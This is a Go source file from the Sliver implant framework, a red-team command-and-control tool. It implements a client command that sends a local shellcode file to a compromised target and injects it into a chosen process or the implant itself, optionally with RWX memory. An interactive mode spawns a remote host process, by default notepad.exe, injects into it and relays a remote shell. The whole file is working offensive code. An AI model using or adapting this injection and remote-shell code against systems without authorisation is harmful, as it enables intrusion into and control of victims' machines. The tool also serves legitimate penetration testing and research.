package execute

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"os"

	"golang.org/x/crypto/ssh/terminal"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ExecuteShellcode - Executes the given shellcode in the sliver process
type ExecuteShellcode struct {
	Positional struct {
		LocalPath string `description:"path to shellcode to inject" required:"1-1"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		RWX         bool   `long:"rwx" short:"r" description:"use RWX permissions for memory pages"`
		PID         uint32 `long:"pid" short:"p" description:"PID of process to inject into (0 means injection into ourselves)"`
		RemotePath  string `long:"process" short:"n" description:"path to process to inject into when running in interactive mode" default:"c:\\windows\\system32\\notepad.exe"`
		Interactive bool   `long:"interactive" short:"i" description:"inject into a new process and interact with it"`
	} `group:"shellcode options"`
}

// Execute - Executes the given shellcode in the sliver process
func (es *ExecuteShellcode) Execute(args []string) (err error) {
	session := core.ActiveTarget

	interactive := es.Options.Interactive
	pid := es.Options.PID
	shellcodePath := es.Positional.LocalPath
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		return log.Errorf("Error: %s", err.Error())
	}
	if pid != 0 && interactive {
		return log.Errorf("Cannot use both `--pid` and `--interactive`")
	}
	if interactive {
		es.executeInteractive(es.Options.RemotePath, shellcodeBin, es.Options.RWX)
		return
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.Name())
	go log.SpinUntil(msg, ctrl)
	task, err := transport.RPC.Task(context.Background(), &sliverpb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: es.Options.RWX,
		Pid:      pid,
		Request:  core.ActiveTarget.Request(),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return log.Errorf("Error: %v", err)
	}
	if task.Response.GetErr() != "" {
		return log.Errorf("Error: %s", task.Response.GetErr())
	}

	log.Infof("Executed shellcode on target\n")
	return
}

func (es *ExecuteShellcode) executeInteractive(hostProc string, shellcode []byte, rwxPages bool) {
	session := core.ActiveTarget

	// Use the client logger for controlling log output
	clog := log.ClientLogger

	// Start remote process and tunnel
	noPty := false
	if session.OS() == "windows" {
		noPty = true // Windows of course doesn't have PTYs
	}

	rpcTunnel, err := transport.RPC.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		// SessionID: session.ID(),
	})

	if err != nil {
		err := log.Errorf("Error: %v", err)
		fmt.Printf(err.Error())
		return
	}

	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())

	shell, err := transport.RPC.Shell(context.Background(), &sliverpb.ShellReq{
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
		Request:   core.ActiveTarget.Request(),
	})

	if err != nil {
		err := log.Errorf("Error: %v", err)
		fmt.Printf(err.Error())
		return
	}
	// Retrieve PID and start remote task
	pid := shell.GetPid()

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.Name())
	go log.SpinUntil(msg, ctrl)
	_, err = transport.RPC.Task(context.Background(), &sliverpb.TaskReq{
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
		Request:  core.ActiveTarget.Request(),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		err := log.Errorf("Error: %v", err)
		fmt.Printf(err.Error())
		return
	}

	clog.Debugf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	log.Infof("Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		clog.Tracef("Saving terminal state: %v", oldState)
		if err != nil {
			err := log.Errorf("Failed to save terminal state")
			fmt.Printf(err.Error())
			return
		}
	}

	clog.Debugf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		clog.Tracef("Wrote %d bytes to stdout", n)
		if err != nil {
			err := log.Errorf("Error writing to stdout: %v", err)
			fmt.Printf(err.Error())
			return
		}
	}()
	for {
		clog.Debugf("Reading from stdin ...")
		n, err := io.Copy(tunnel, os.Stdin)
		clog.Tracef("Read %d bytes from stdin", n)
		if err == io.EOF {
			break
		}
		if err != nil {
			err := log.Errorf("Error reading from stdin: %v", err)
			fmt.Printf(err.Error())
			break
		}
	}

	if !noPty {
		clog.Debugf("Restoring terminal state ...")
		terminal.Restore(0, oldState)
	}

	clog.Debugf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()

}
